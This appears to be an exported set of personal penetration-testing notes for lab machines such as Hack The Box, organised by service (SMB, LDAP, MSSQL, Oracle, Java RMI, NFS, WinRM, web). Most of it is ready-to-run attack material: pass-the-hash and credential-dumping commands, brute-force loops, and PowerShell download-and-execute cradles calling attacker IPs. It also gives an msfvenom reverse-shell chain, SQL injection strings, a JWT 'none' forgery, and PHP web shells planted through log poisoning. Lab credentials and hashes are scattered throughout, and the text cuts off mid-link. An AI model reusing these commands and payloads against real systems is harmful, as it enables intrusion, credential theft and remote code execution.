113</h1><br/>ident-user-enum 192.168.1.13 22 139 445<br />                          ^IP              ^Ports to look for owning user on (Try all open ports)</div><div class='page'><h1 class='title level-2'>smb</h1><br/>add “client min protocol = LANMAN1” to global section of /etc/samba/smb.conf<br />enum4linux<br />nmap --script smb-vuln* -p 139,445 192.168.11.1<br />smbmap -H 10.10.10.161<br />smbmap -H 10.10.10.103 -u null -p null<br />smbclient -N -L //10.10.10.103<br />    smbclient -N ‘//10.10.10.103/Department Shares’<br />rpcclient 10.10.10.161<br />rpcclient -U ‘’ 10.10.10.161<br />    enumdomusers<br />    queryuser tony<br />    queryusergroups 0x47b<br />    querygroup 0x201<br /><br />crackmapexec smb 10.10.10.161<br />crackmapexec smb 10.10.10.161 --pass-pol -u ‘’ -p ‘’<br /><br />GetADUsers.py -dc-ip 10.10.10.161 &#39;htb.local/&#39; -all<br />GetNPUsers.py -dc-ip 10.10.10.161 -request &#39;htb.local/&#39; -format hashcat<br />GetUserSPNs.py -dc-ip 10.10.10.161 -request &#39;htb.local/&#39;                                        &lt;This means the user is Kerberoastable!! Crack the hash and you win the war!!<br />getArch.py  -target 10.10.10.161<br /><br /><br /><br /><br /><br />Credentialed<br />smbmap -H 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18                     &lt;put hash in place of password in LM:NTLM format example: 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B<br />smbclient -h &#39;\\10.10.10.169\sysvol&#39; -U melanie -W megabank.local -I 10.10.10.169       &lt;to use a hash as a password add the --pw-nt-hash argument to the end with the same LM:NTLM hash syntax<br /><br /><br /><br />crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares<br /><br /><br />GetADUsers.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -all<br />GetNPUsers.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -request -format hashcat<br />GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -request<br /><br /><br /><br /><br /><br /><table class="table"><tr><th>click me</th><th>click me</th></tr><tr><td> </td><td>bureaulampje</td></tr></table><br />bureaulampje<br /></div><div class='page'><h1 class='title level-3'>brute force</h1><br/>crackmapexec smb 10.10.10.161 -u userlist.txt -p passwordlist.txt<br /><br />#!/bin/python3<br />import os<br />names = [<br />&quot;zach&quot;, &quot;gustavo&quot;, &quot;claude&quot;, &quot;per&quot;, &quot;felicia&quot;, &quot;claire&quot;, &quot;fred&quot;, &quot;annette&quot;, &quot;stevie&quot;, &quot;angela&quot;, &quot;ulf&quot;, &quot;marcus&quot;, &quot;abigail&quot;, &quot;sally&quot;, &quot;annika&quot;, &quot;marko&quot;, &quot;melanie&quot;, &quot;paulo&quot;<br />]<br />for name in names:<br />        print(name)<br />        os.system(&quot;smbmap -u {} -d megabank.local -p Welcome123! -H 10.10.10.169&quot;.format(name))<br /><br /><br />#!/usr/bin/python3<br />import os<br />import subprocess<br /><br />users   = open(&#39;users.txt&#39;).read().split()<br />passs   = open(&#39;pass.txt&#39;).read().split()<br /><br />for user in users:<br />        for pw in passs:<br />                print(&quot;{}:{}&quot;.format(user,pw))<br />                os.system(&quot;smbmap -u {} -d megabank.local -p {} -H 10.10.10.172&quot;.format(user, pw))</div><div class='page'><h1 class='title level-3'>mount</h1><br/>smbserver.py yeet `pwd`<br /><br />net use y: \\10.10.14.60\yeet<br />y:<br />or with powershell<br />new-psdrive -Name “x” -PSProvider “FileSystem” -Root “\\10.10.14.60\yeet”<br />cd yeet<br />^^now you can copy things into and out of the kali box<br /><br /><br /><br /><br />mount -t cifs -o username=Finance //10.10.10.59/ACCT /mnt/smb/<br />&gt;prompt for password<br />cd /mnt/smb<br />or<br />mount -t cifs ‘//10.10.10.103/Department Shares’ /mnt/smb   &lt;for null authentication<br />&gt;prompt for password (hit enter)<br />cd /mnt/smb<br /><br /><br /><br /><br /><br />Mount on local windows (assuming you are networked to the box (switch the vpn))<br /><br />runas /netonly /user:Squidy cmd<br />prompt for pass&gt;<br />new terminal will pop up<br />dir \\10.10.10.100\users    &lt;you can now navigate to that share<br /><br /><br /><br /><a href="https://linuxconfig.org/how-to-mount-usb-drive-on-kali-linux">https://linuxconfig.org/how-to-mount-usb-drive-on-kali-linux</a></div><div class='page'><h1 class='title level-3'>GotCreds???</h1><br/>crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares<br /><br />./secretsdump.py htb.local/squid:YeeYeeYee@10.10.10.161<br /><br />psexec.py htb/administrator:PASSWORD@10.10.10.161<br />psexec.py htb/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -dc-ip 10.10.10.161<br /><br /><br />if psexec.py fails, try smbexec.py and wmiexec.py (syntax is identical)<br /><br />ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p &#39;Welcome123!&#39; <br />smbclient -h &#39;\\10.10.10.169\sysvol&#39; -U melanie -W megabank.local -I 10.10.10.169<br />smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -x whoami<br /><br /><br /><br />for real credsVV<br />winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe                  <br />    winexe -U jenkins/administrator //10.10.10.63 cmd.exe       will prompt you for creds<br /><br />for NTLM Hashes VV<br />pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe     <br />    pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe       will prompt you for creds<br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>PrivEsc</h1><br/><br /></div><div class='page'><h1 class='title level-4'>mount</h1><br/>smbserver.py yeet `pwd`<br /><br />net use y: \\10.10.14.60\yeet<br />y:<br />or with powershell<br />new-psdrive -Name “x” -PSProvider “FileSystem” -Root “\\10.10.14.60\yeet”<br />cd yeet<br /><br />^^now you can copy things into and out of the kali box<br /><br /><br /><br /><br />mount -t cifs -o username=Finance //10.10.10.59/ACCT /mnt/smb/<br />&gt;prompt for password<br />cd /mnt/smb</div><div class='page'><h1 class='title level-3'>Tools</h1><br/>enum4linux -a 192.168.11.140 &gt; e4lResults.txt         &lt;&lt;&lt;&lt;This is for overall badass enum (possible usernames!!)<br /><br />smbclient -L ‘\\10.10.10.123\’<br /><br />smbmap -H 192.168.11.140                                        &lt;&lt;&lt;&lt;shows you what shares you can read<br />    &gt;smbclient ‘\\192.168.11.140\share$’                    &lt;&lt;&lt;&lt;connects to a share<br /><br />?rpcclient stuff?&lt;&lt;&lt;&lt;no fucking clue, but probably important<br /><br /><code>nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10</code><br /><br />python2 ./ridenum.py 10.10.10.161 500 50000 svc-alfresco s3rvice<br /><br />python ../GetNPUsers.py -request -format john HTB/svc-alfresco &gt; yee.txt<br /><br />is the machine running samba??? If the samba is old this may root the machine for you! &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; <a href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a>   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br /><br />non-metasploit eternal blue? <a href="https://github.com/helviojunior/MS17-010.git">https://github.com/helviojunior/MS17-010.git</a>  <a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/">https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/</a><br /><br /><br /><br /><br /><br /><br /><a href="https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#samba">https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#samba</a>       &lt;&lt;&lt;&lt;if all else fails, this is a great site<br /><br />??!!WHAT AM I DOING!!??<br />find files<br />find usernames<br />can I put?<br /><br /><br /><br /><br />keep in mind<br />    search for groups.xml   &lt;&lt;can then be cracked with gpp-decrypt</div><div class='page'><h1 class='title level-4'>ippsec order of operations</h1><br/>enum4linux<br />nmap --script smb-vuln* -p 139,445 192.168.11.1<br />smbmap -H 10.10.10.161<br />    smbclient -h &#39;\\10.10.10.169\sysvol&#39; -U melanie -W megabank.local -I 10.10.10.169<br />rpcclient 10.10.10.161<br />rpcclient -U ‘’ 10.10.10.161<br />    enumdomusers<br />    queryuser tony<br />    queryusergroups 0x47b<br />    querygroup 0x201<br /><br />crackmapexec smb 10.10.10.161<br />crackmapexec smb 10.10.10.161 --pass-pol -u ‘’ -p ‘’<br /><br />GetADUsers.py -dc-ip 10.10.10.161 &#39;htb.local/&#39;<br />GetNPUsers.py -dc-ip 10.10.10.161 -request &#39;htb.local/&#39; -format hashcat<br />GetUserSPNs.py -dc-ip 10.10.10.161 -request &#39;htb.local/&#39;<br />getArch.py  -target 10.10.10.161</div><div class='page'><h1 class='title level-4'>evil-winrm</h1><br/>sudo gem install winrm winrm-fs colorize stringio <br />git clone https://github.com/Hackplayers/evil-winrm.git <br />cd evil-winrm<br />ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’<br /><br /><br /><br /><a href="https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/">https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/</a><br /><br /><br />ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p &#39;Welcome123!&#39; -e /root/Desktop/Machines/HTB/Resolute/<br />^^so you can upload binary&#39;s from that directory        or -s to upload scripts (sherlock)<br />menu<br />invoke-binary `tab`</div><div class='page'><h1 class='title level-4'>enum4linux</h1><br/>enum4linux -a 192.168.11.140<br /><br />enum4linux -u marko -p Welcome123! -a 10.10.10.169<br /></div><div class='page'><h1 class='title level-4'>nmap</h1><br/>nmap --script smb-vuln* -p 139,445 192.168.11.1<br /><br /><code>nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10</code><br /><br /><code>nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10</code></div><div class='page'><h1 class='title level-4'>smbmap</h1><br/>smbmap -H 192.168.11.140 -P 139 -R <br /><br /><br /><br />smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -R<br /><br />^^^^^^^^^^^^^^^^^^^^^^^^^^^^advanced smbmap<br /><br /><br />smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -x whoami<br /></div><div class='page'><h1 class='title level-4'>smbclient</h1><br/>smbclient -h &#39;\\10.10.10.169\sysvol&#39; -U melanie -W megabank.local -I 10.10.10.169<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><code>    smbclient &#39;\\192.168.xx.xx\share$&#39;<br />    mask &quot;&quot;<br />    recurse ON<br />    prompt OFF<br />    cd &#39;path\to\remote\dir&#39;<br />    lcd &#39;~/path/to/download/to/&#39;<br />    mget *</code></div><div class='page'><h1 class='title level-4'>smbserver.py</h1><br/>first we have got to get it on the kali...<br />on the kali<br />    smbserver.py yeet `pwd`<br />on the target<br />    net use x: \\10.10.14.60\yeet<br />    x:<br />now you can copy things between machines<br /><br />This will also dump you the users hash.</div><div class='page'><h1 class='title level-5'>mount</h1><br/>mount -t cifs -o username=Finance //10.10.10.59/ACCT /mnt/smb/<br />&gt;prompt for password<br />cd /mnt/smb</div><div class='page'><h1 class='title level-4'>GetADUsers.py</h1><br/>GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100</div><div class='page'><h1 class='title level-4'>ridenum</h1><br/>python2 /Yeet/Tools/ridenum/ridenum.py 10.10.10.161 500 50000 /Yeet/Tools/Wordlists/rockyou.txt users.txt           &lt;&lt;users.txt is self generated from list of found users<br /><br /><br /><br />python2 /root/Desktop/Tools/ridenum/ridenum.py 10.10.10.169 500 50000 melanie Welcome123!<br /></div><div class='page'><h1 class='title level-4'>rpcclient</h1><br/>rpcclient -U &quot;&quot; -N 192.168.11.140<br /><br />    enumdomusers</div><div class='page'><h1 class='title level-4'>smb loop</h1><br/>#!/usr/bin/python3<br />import os<br />import subprocess<br /><br />users   = open(&#39;users.txt&#39;).read().split()<br />passs   = open(&#39;pass.txt&#39;).read().split()<br /><br />for user in users:<br />        for pw in passs:<br />                print(&quot;{}:{}&quot;.format(user,pw))<br />                os.system(&quot;smbmap -u {} -d megabank.local -p {} -H 10.10.10.172&quot;.format(user, pw))</div><div class='page'><h1 class='title level-4'>psexec</h1><br/>psexec.py active.htb/svc_tgs@10.10.10.100</div><div class='page'><h1 class='title level-2'>snmp</h1><br/>snmp-check 10.10.10.161<br /><br /></div><div class='page'><h1 class='title level-2'>ldap</h1><br/>nmap -p 389 --script ldap-search -Pn 10.10.10.107<br /><br />ldapsearch -h 10.10.10.161 -x<br /><br />ldapsearch -h 10.10.10.161 -x -s base namingcontexts       &lt;this should dump domain name   ex DC=htb,DC=local !!!!!!!!!!!!!!!!!!!!!!THERE IS NO E IN NAM!!!!!!!!!!!!!!!!!!!!!!!<br /><br />ldapsearch -h 10.10.10.161 -x -b “DC=htb,DC=local”          &lt;dumps assload of queryable ldap stuff <br /><br />ldapsearch -h 10.10.10.161 -x -b “DC=htb,DC=local” ‘(objectClass=Person)’ sAMAccountName &lt;example of ldap query<br />                                                                                 ^^query                       ^Filter<br /><br />-D ‘squid@htb.local’ -w ‘YeeYeeYee’     &lt;syntax to add credentials<br /><br />ldapsearch -x -h sizzle.htb.local -D ‘amanda@htb.local’ -w ‘Ashare1972’ -b ‘dc=htb,dc=local’ “(&amp;(objectClass=user)(memberof=CN=Domain Admins,CN=Users,DC=htb,DC=local))”<br />^^grep that for sAMAccountName to get just domain admins<br /><br /><br /><br /><br />ypuffy --do machine<br />sizzle  --watch video done<br />if FQDN=ypuffy.hackthebox.htb<br />    base=&#39;DC=hackthebox,DC=htb&#39;</div><div class='page'><h1 class='title level-2'>java-rmi 1099/1100</h1><br/>nmap -sC -sV -Pn 10.11.1.73 -p 1100 <br />    may dump the reg of the java-rmi instance. If this is the case the machine may be vulnerable to a deserializaion exploit.<br />    BaRMIe.jar is the way to go to directly exploit this vulnerability.<br />    <a href="https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01">https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01</a>      is where the latest build is hosted, pre-built<br />    <br />useage<br />    java -jar BaRMIe_v1.01.jar -attack 10.11.1.73 1100<br />    target select)          1<br />    available attacks)    1 (illegal bind deserialization)<br />    payloads)                1 (Apache Common Collections 3.1 worked for me, others may also work)<br />    OS Command)         powershell.exe -command &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.119.167:80/3232.ps1&#39;)&quot;<br />    <br />    enjoy your system shell!</div><div class='page'><h1 class='title level-2'>mssql 1433</h1><br/>sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G<br /><br />###the goal is to get xp_cmdshell working###<br />1. try and see if it works<br />    xp_cmdshell ‘whoami’<br />    go<br /><br />2. try to turn component back on<br />    EXEC SP_CONFIGURE &#39;xp_cmdshell&#39; , 1<br />    reconfigure<br />    go<br />    xp_cmdshell ‘whoami’<br />    go<br /><br />3. &#39;advanced&#39; turn it back on<br />    EXEC SP_CONFIGURE &#39;show advanced options&#39;, 1<br />    reconfigure<br />    go<br />    EXEC SP_CONFIGURE &#39;xp_cmdshell&#39; , 1<br />    reconfigure<br />    go<br />    xp_cmdshell &#39;whoami&#39;<br />    go<br /><br />--or--<br />python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py reporting:&#39;PcwTWTHRwryjc$c6&#39;@10.10.10.125 -windows-auth<br /><br />--NOTE-- I do not know why mssqlclient would work and sqsh would not.<br /><br /><br />xp_cmdshell &quot;powershell.exe -exec bypass iex(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/ye443.ps1')"">http://10.10.14.60:8000/ye443.ps1&#39;)&quot;</a><br /><br /><br /><br />exec xp_dirtree &#39;\\10.10.14.8\tools&#39;,1,1<br />^^Setup an pythonsmbserver on your kali and run this to dir it. This may give you an NTLM hash.<br /> python3 <strong><span style="color:#ff9d00;">/</span></strong>usr<strong><span style="color:#ff9d00;">/</span></strong>share<strong><span style="color:#ff9d00;">/</span></strong>doc<strong><span style="color:#ff9d00;">/</span></strong>python3-impacket<strong><span style="color:#ff9d00;">/</span></strong>examples<strong><span style="color:#ff9d00;">/</span></strong>smbserver.py -smb2support tools `pwd`<br />hashcat64.exe -m 5600 .\yeet\Querier.txt .\yeet\rockyou.txt --show<br /></div><div class='page'><h1 class='title level-2'>oracle 1521</h1><br/>navigate to https://github.com/quentinhardy/odat/releases/<br />download the latest<br />tar -xvf odat-linux-libc2.12-x86_64.tar.gz<br />cd odat-libc2.12-x86_64/<br />./odat-libc2.12-x86_64 all -s 10.10.10.82<br /><br /><a href="https://github.com/quentinhardy/odat/wiki">https://github.com/quentinhardy/odat/wiki</a><br /><a href="https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573">https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573</a><br /><br /><br /><br />1. if db is password protected<br />hydra -P /Yeet/Tools/Wordlists/rockyou.txt -t 32 -s 1521 10.10.10.82 oracle-listener<br /><br />2. discover sid<br />nmap --script=oracle-sid-brute -p 1521 10.10.10.82<br />--or--<br />hydra -L ./sids.txt -s 1521 10.10.10.82 oracle-sid<br />--or--<br />python3 /Yeet/Machines/HTB/Silo/odat/odat sidguesser -s 10.10.10.82<br />--or--<br />python3 /Yeet/Machines/HTB/Silo/odat/odat all -s 10.10.10.82                    &lt;&lt;&lt;&lt;recomended to start even though it be way slow<br /><br />3. brute logins on the sid<br />python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file ../oracle_userpass.txt<br />                                                                                ^ is the sid                ^password list on my private github repo<br />                                                                                <br />4. login with sqlplus64 (subnode)<br /><br /><br /><br />5. Shot in the dark. Try to upload and execute msfvenom shellcode with your creds<br />msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.14.60 lport=3232 -f exe &gt;3232.exe<br />python3 ./odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile /temp 3232.exe 3232.exe<br />nc -nlvp 3232<br />python3 ./odat.py externaltable -s 10.10.10.82 -U -P tiger -d XE --sysdba --exec /temp 3232.exe<br />enjoy your shell! <br /><br /><br /><br /><br /><br /><br /><br /><br /><br />&gt;&gt;oracle default wordlist is on my private github repo</div><div class='page'><h1 class='title level-3'>sql</h1><br/>login--<br />sqlplus64 scott/tiger@10.10.10.82:1521/XE<br />sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba         &lt;to login as sysdba<br /><br />show privs--<br />select * from session_privs;             To show privledge<br />select * from user_role_privs;<br /><br />turn on screen output--<br />set serveroutput ON<br /><br />short script to read files--<br />declare<br />    f utl_file.file_type;<br />    s varchar(200);<br />begin<br />    f := utl_file.fopen(&#39;/inetpub/wwwroot&#39;, &#39;iisstart.htm&#39;, &#39;r&#39;);<br />    utl_file.get_line(f,s);<br />    utl_file.fclose(f);<br />    dbms_output.put_line(s);<br />end;<br />/<br /><br />short script to write files--<br />declare<br />    f utl_file.file_type;<br />    s varchar(5000) := &#39;yeet&#39;;<br />begin<br />    f := utl_file.fopen(&#39;/inetpub/wwwroot&#39;, &#39;cannon.txt&#39;, &#39;w&#39;);<br />    utl_file.put_line(f,s);<br />    utl_file.fclose(f);<br />end;<br />/</div><div class='page'><h1 class='title level-2'>nfs 2049</h1><br/>apt install nfs-common<br />showmount 10.10.10.180      ~or~showmount -e 10.10.10.180<br />    should show you available shares (example /home)<br />    <br />mount -t nfs -o ver=2 10.10.10.180:/home /mnt/<br />cd /mnt<br />nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in<br /><br /><br /><a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst">https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst</a></div><div class='page'><h1 class='title level-2'>winrm 5985</h1><br/></div><div class='page'><h1 class='title level-3'>Evil-winrm</h1><br/>sudo gem install winrm winrm-fs colorize stringio <br />git clone https://github.com/Hackplayers/evil-winrm.git <br />cd evil-winrm<br />ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’<br /><br /><br /><br /><a href="https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/">https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/</a><br /><br /><br />ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p &#39;Welcome123!&#39; -e /root/Desktop/Machines/HTB/Resolute/<br />^^so you can upload binary&#39;s from that directory        or -s to upload scripts (sherlock)<br />menu<br />invoke-binary `tab`</div><div class='page'><h1 class='title level-3'>ExecuteWithPython3</h1><br/>python3<br />import winrm<br />s = winrm.Session(&#39;windows-host.example.com&#39;, auth=(&#39;john.smith&#39;, &#39;secret&#39;))<br />print(s.run_cmd(&#39;ipconfig&#39;))<br />print(s.run_ps(&#39;ipconfig&#39;))</div><div class='page'><h1 class='title level-1'>Web</h1><br/></div><div class='page'><h1 class='title level-2'>Order of Operations</h1><br/>looked at source code for comments<br />looked for twitter marks<br />looked at all protocols running (almost always more than just apache) often found in meta<br />looked for modules (often found in with themes)<br />tried      <code>admin&#39; or 1=1 #</code>       ‘ or 1=1 #       on the login page in the user piece aswell as the login with a valid user<br />    username=&#39; or &#39;1&#39;=&#39;1<br />    password=&#39; or &#39;1&#39;=&#39;1<br />is there any git shit<br />ran in burp to find PUT<br />ctrl F&#39;d through the source code for something like &lt;room.php?cod=2&gt; this may mean sql injection or lfi<br />../../../../../../../../../etc/passwd<br />checked for sql injection (&#39;;)<br />ran wfuzz on login page<br />reran dirsearch with small list looking for more file types        php,exe,sh,py,html,pl<br />tried shellshock</div><div class='page'><h1 class='title level-2'>Console Interaction</h1><br/>right click on thing and select &quot;inspect element&quot;<br /><br />&lt;span id=&quot;thm-title&quot;&gt;yeet&lt;/span&gt;<br />	Note the id &quot;thm-title&quot;<br />$(&#39;#thm-title&#39;)	<br />	#Look at the variable thm-title<br />$(&#39;#thm-title&#39;).text()<br />	#Look at the text contained in thm-title <br />$(&#39;#thm-title&#39;).text(&#39;yeet&#39;)<br />	#change the text in thm-title to yeet<br /><br />document.getElementById(&#39;thm-title&#39;).innerHTML=&quot;test&quot;;<br />	#Same idea, just done another way<br />	#The &quot;;&quot; is needed if you wanted to do this via stored xxs</div><div class='page'><h1 class='title level-2'>Methods</h1><br/></div><div class='page'><h1 class='title level-3'>Authentication</h1><br/></div><div class='page'><h1 class='title level-4'>Brute Force</h1><br/>Use Burp. It be gud at dis.<br />hydra -l wade -P ./fsocity.dic 10.10.163.14 -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</div><div class='page'><h1 class='title level-4'>re registration</h1><br/>try to register as an existing account, but with a leading space before the name.<br />Example:<br />	&quot;admin&quot;=&quot; admin&quot;<br />	This may allow you to effectivley change the password of that account.</div><div class='page'><h1 class='title level-4'>JWT</h1><br/></div><div class='page'><h1 class='title level-5'>RsaToHmac</h1><br/><a href="https://github.com/Goron/TokenBreaker/blob/master/RsaToHmac.py">https://github.com/Goron/TokenBreaker/blob/master/RsaToHmac.py</a><br /><a href=""><img src="images/1585-1.png" alt="images/1585-1.png" /></a></div><div class='page'><h1 class='title level-5'>HmacToNone</h1><br/>Sessions can be hijacked via Json Web Tokens.<br />Use Burp.<br />If you see JWT at the bottom of the header on a login, you may be able to enumerate, and login as other users.<br />JWT&#39;s are broken into three parts seperated by &quot;.&quot;.<br />base64 decode the first piece and replace the alg value (probaly &quot;HS256&quot;) with &quot;NONE&quot;. Base64 encode that. Now you have your first section.<br />	---NOTE---For this to work, it seems like the the line being encoded needs to be on one line---NOTE---<br />base64 decode the second piece and iterate through &quot;identity&quot; values (0 is often admin). base64 encode that now you have your second section.<br />	---NOTE---The one line rule still applies---NOTE---<br />	---NOTE---Add a traling &quot;.&quot; You do not need the third piece.<br />	<br />Example:<br />eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTcwMzM3NjMsImlhdCI6MTYxNzAzMzQ2MywibmJmIjoxNjE3MDMzNDYzLCJpZGVudGl0eSI6MX0.SHClIHyJ5M13tg-yYbiy39Wz6gsdMNs-itRR286_3-E<br />can turn into<br />ewogInR5cCI6ICJKV1QiLAogImFsZyI6ICJOT05FIn0K.eyJleHAiOiAxNjE3MDMzNzYzLCJpYXQiOiAxNjE3MDMzNDYzLCJuYmYiOiAxNjE3MDMzNDYzLCJpZGVudGl0eSI6IDB9.<br /><br /><br /><br />Helpful tools are jwt.io, Joseph(burp),json web tokens(burp), firefox cookie handler and cyberchef.<br />BUT THE BEST TOOL IS: <a href="https://github.com/Goron/TokenBreaker">https://github.com/Goron/TokenBreaker</a><br /><a href=""><img src="images/1586-1.png" alt="images/1586-1.png" /></a></div><div class='page'><h1 class='title level-5'>Brute Force Secrets</h1><br/><a href=""><img src="images/1587-1.png" alt="images/1587-1.png" /></a><br /><a href=""><img src="images/1587-2.png" alt="images/1587-2.png" /></a></div><div class='page'><h1 class='title level-4'>NoAuth</h1><br/>Sometimes you may be logged in and the URl will look like this.<br /><a href="http://10.10.82.224:7777/users/1?">http://10.10.82.224:7777/users/1?</a><br />Play with it. That trailing number may be a SID of somekind.<br /><a href="http://10.10.82.224:7777/users/0?">http://10.10.82.224:7777/users/0?</a> is a good guess at the admin account. </div><div class='page'><h1 class='title level-3'>CSRF</h1><br/>Cross Site Request Forgery.<br />CSRF occurs when a user visits a page on a site, that performs an action on a different site. For instance, let&#39;s say a user clicks a link to a website created by a hacker, on the website would be an html tag such as &lt;img src=&quot;<a href="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">">https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;&gt;</a>  which would change the account email on the vulnerable website to &quot;pwned@evil-user.net&quot;.  CSRF works because it&#39;s the victim making the request not the site, so all the site sees is a normal user making a normal request.<br /><br />This opens the door, to the user&#39;s account being fully compromised through the use of a password reset for example. The severity of this cannot be overstated, as it allows an attacker to potentially gain personal information about a user, such as credit card details in an extreme case.<br /><br />Catch a request and change the value of a field.<br /><br />There is a tool to automate this process: pip3 install xsrfprobe<br />	xsrfprobe-u &lt;url&gt;/endpoint --malicious</div><div class='page'><h1 class='title level-3'>LFI/RFI</h1><br/>If they exist, use them.<br />Dope resource of fields to try: <a href="https://github.com/payloadbox/rfi-lfi-payload-list">https://github.com/payloadbox/rfi-lfi-payload-list</a><br /><br />if you can dump a /home/squilly/.ssh/id_rsa	You are in pretty good shape.<br /><br /><a href="https://github.com/P0cL4bs/Kadimus">https://github.com/P0cL4bs/Kadimus</a>    &lt;&lt;&lt;&lt;checkitout<br /><br />/etc/passwd                                                     &lt;&lt;&lt;&lt;&lt;&lt;You are in Luck!!<br />/etc/group<br /><br />/usr/local/etc/apache/httpd.conf                   &lt;&lt;&lt;&lt;&lt;&lt;&lt;look for info<br />/usr/local/etc/apache1/httpd.conf<br />/usr/local/etc/apache2/httpd.conf<br />/usr/local/etc/apache21/httpd.conf<br />/usr/local/etc/apache22/httpd.conf<br /><br />/etc/nginx/nginx.conf                                       &lt;&lt;&lt;&lt;Look into log Poisioning<br />access_log /var/log/nginx/access.log<br />/var/log/httpd-error.log</div><div class='page'><h1 class='title level-3'>Log Poisioning</h1><br/>look for a config file (192.168.11.131/thankyou.php?file=/etc/nginx/nginx.conf)<br />in the config file look for .log things (access_log /var/log/nginx/access.log)<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />This method of log poisioning puts a variable into /var/log/nginx/error.log. From there you can run commands!<br /><br />GET /thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;])?&gt;<br /><br /><br />&lt;?php system($_GET[&#39;cmd&#39;])?&gt;<br /><br />&lt;?fphp+system($_GET[&#39;cmd&#39;])+?&gt;<br /><br />/var/log/nginx/error.log&amp;cmd=whoami<br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>User Agent</h1><br/> <br />###All with Burp### <br />1. Overwrite UserAgent String with<br />   1) &lt;?php system($_REQUEST[&#39;YeetCannon&#39;]); ?&gt;<br />   2) If it reads back “ Cannot execute a blank command in &lt;b&gt;C:\inetpub\wwwroot\internal-01\log\log.php” you are making it happen!!<br />2. Replace Useragent sting with anything<br />   3) hotdog will do<br />3. add &amp;YeetCannon=whoami to the end of the url<br />   4) /log/log.php?filename=log.php&amp;username=harvey&amp;YeetCannon=whoami<br />   5) run... you should be executing code!!<br /> <br /> <br /> ###ReverseShell###<br /> This worked for me after hosting ye3232.ps1 (InvokePowershell-TCp.ps1) on 8080 and listening on 3232 <br /> <br /> <a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=powershell.exe</a><a 